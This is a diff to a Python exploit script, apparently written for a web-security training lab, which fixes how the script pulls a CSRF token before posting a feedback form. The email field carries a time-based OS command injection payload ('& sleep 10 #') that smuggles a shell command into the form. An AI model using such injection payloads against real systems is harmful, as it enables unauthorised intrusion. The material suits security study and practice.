@@ -21,7 +21,7 @@ def get_csrf_token(s, url):
     r = s.get(url + path, verify=False, proxies=proxies)
 
     soup = BeautifulSoup(r.text, "html.parser")
-    csrf_token = soup.find(name="csrf")
+    csrf_token = soup.find("input", {"name": "csrf"})["value"]
     if csrf_token:
         return csrf_token
     else:
@@ -31,7 +31,7 @@ def get_csrf_token(s, url):
 def os_command_injection(s, url):
     stock_path = "/feedback/submit"
     command_injection = "1337@1337.org & sleep 10 #"
-    csrf = " "
+    csrf = get_csrf_token(s, url)
     data = {"csrf": csrf, "name": '1', "email": command_injection, "subject": "adafa", "message": "gsgsg"}
     r = s.post(url + stock_path, data=data, verify=False, proxies=proxies)
 
